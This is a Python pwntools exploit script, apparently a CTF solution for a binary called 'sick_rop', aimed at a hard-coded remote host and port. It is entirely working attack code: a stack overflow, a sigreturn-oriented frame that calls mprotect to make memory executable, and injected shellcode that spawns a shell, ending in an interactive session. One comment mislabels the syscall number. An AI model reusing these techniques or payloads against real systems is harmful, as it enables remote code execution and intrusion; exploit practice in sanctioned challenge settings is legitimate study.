#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

exe = context.binary = ELF('./sick_rop')

host = args.HOST or '167.99.202.131'
port = int(args.PORT or 32178)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x40104e
continue
'''.format(**locals())

# -- Exploit goes here --

sr_frame = SigreturnFrame(kernel='amd64')

sr_frame.rax = 0xa # 15 - mprotect syscall
sr_frame.rdi = 0x400000 # start of memaddr
sr_frame.rsi = 0x4000 # nbytes
sr_frame.rdx = 0x7 # RWX
sr_frame.rsp = 0x4010d8 # entry point
sr_frame.rip = 0x401014 # syscall; ret

# ------------------

io = start()

payload = b"A"*40
payload += p64(0x40102e)
payload += p64(0x401014) # syscall; ret;
payload += bytes(sr_frame)
payload += p64(0x401014)
#payload += b"A"*(300-len(payload))

io.sendline(payload)

payload = b"B"*14

io.sendline(payload)

sleep(1)

shellcode = b""
shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96"
shellcode += b"\x91\xd0\x8c\x97\xff\x48\xf7"
shellcode += b"\xdb\x53\x54\x5f\x99\x52\x57"
shellcode += b"\x54\x5e\xb0\x3b\x0f\x05"

payload = b'A'*40
payload += p64(0x4010b8 + 48)
payload += shellcode

io.sendline(payload)

io.interactive()

